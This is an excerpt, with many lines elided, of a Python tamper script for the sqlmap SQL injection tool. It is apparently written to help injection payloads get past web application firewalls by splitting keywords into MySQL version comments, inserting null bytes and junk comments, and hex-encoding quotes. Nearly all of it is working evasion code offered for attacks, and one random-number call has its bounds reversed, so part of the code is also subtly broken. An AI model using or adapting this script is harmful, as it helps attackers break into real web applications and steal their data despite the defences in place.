...
__priority__ = PRIORITY.LOW # Run late in the tamper chain

def tamper(payload, **kwargs):
    """
    stealth_evasion_v2.py: A new sqlmap tamper script designed for robust WAF bypass,
    focusing on dynamic keyword splintering, aggressive whitespace obfuscation,
    and comment injection, while avoiding the specific CHAR() obfuscation that
    caused previous internal Python errors.
    """
    if payload:
            ...
            if re.search(r'\b{}\b'.format(re.escape(keyword)), payload, re.IGNORECASE):
                ...
                for i, part in enumerate(parts):
                    ...
                    if random.random() < 0.7: # 70% chance to wrap in version comment
                        random_mysql_version = random.randint(50000, 50500) # Ensure valid range
                        obfuscated_parts.append(f"/*!{random_mysql_version}{part}*//*!{random.randint(1,99)}*/")
        ...
        def generate_random_whitespace_obfuscation():
            options = [
                f"/*!{random.randint(1, 99)}*/",      # Small random version comment
                ...
                f"%0a/*!{random.randint(1,9)}*/",      # Newline with small version comment
                "%00",                                 # Null byte
                f"/*{random.randint(1000, 99)}*/",    # Numeric junk comment
        ...
        char_replacements = {
            ',': f"/*!{random.randint(50000,50500)}*/,/*!{random.randint(1,99)}*/", # Comma with surrounding comments
            '(': f"/*!{random.randint(50000,50500)}*/(/*!{random.randint(1,99)}*/", # Opening parenthesis with comments
            ')': f"/*!{random.randint(50000,50500)}*/)/*!{random.randint(1,99)}*/", # Closing parenthesis with comments
            '.': f"/*!{random.randint(50000,50500)}*/./*!{random.randint(1,99)}*/", # Dot with comments
            '=': f"/*!{random.randint(50000,50500)}*/=/*!{random.randint(1,99)}*/"  # Equals sign with comments
        }
        for char, replacement in char_replacements.items():
            payload = payload.replace(char, replacement)

        # Always hex-encode single quotes. This is a common and reliable bypass.
        payload = payload.replace("'", f"0x27/*!{random.randint(1,99)}*/")
        ...
        junk_options = [
            ...
            "/*//*/",
            "/**//**/",
            f"/*!{random.randint(10000, 99999)}*/", # Larger random numbers
        ]
        num_junk_insertions = random.randint(2, 5) # Insert 2 to 5 junk pieces
